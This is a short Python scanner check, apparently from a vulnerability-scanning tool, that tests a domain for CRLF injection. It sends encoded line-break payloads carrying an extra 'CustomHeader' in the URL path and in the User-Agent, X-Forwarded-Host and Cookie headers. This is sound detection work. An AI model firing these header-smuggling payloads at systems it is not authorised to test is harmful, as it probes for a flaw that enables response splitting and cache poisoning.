import requests
import os
import json

header_value = 'Value'
full_header = 'CustomHeader: Value'
check_header = 'CustomHeader'
fuzz_headers = [
    'User-Agent',
    'X-Forwarded-Host',
    'Cookie'
]

url = 'https://{0}'.format(os.environ.get('DOMAIN'))
vuln_id = os.environ.get('VULN_ID')


def resp(state=False):
    if state:
        return json.dumps({"vulnerable": "True", "vuln_id": vuln_id, "description": url})
    else:
        return json.dumps({"vulnerable": "False", "vuln_id": vuln_id, "description": url})


def build_payoad():
    delimiters = ['%0d', '%0a', '%0d%0a', '%00%0d', '%00%0a', '%00%0d%0a',]
    return [header_value + delimiter + full_header for delimiter in delimiters]


def check():
    try:
        for payload in build_payoad():
            # inject in url
            if check_header in dict(requests.get(url + '/' + payload, timeout=4).raw.headers).keys():
                return resp(True)
            # inject in value of header
            for fuzz_header in fuzz_headers:
                if check_header in dict(requests.get(url, timeout=4, headers={fuzz_header: payload}).raw.headers).keys():
                    return resp(True)
    except Exception as ex:
        pass
    return resp(False)


if __name__ == '__main__':
    print(check())
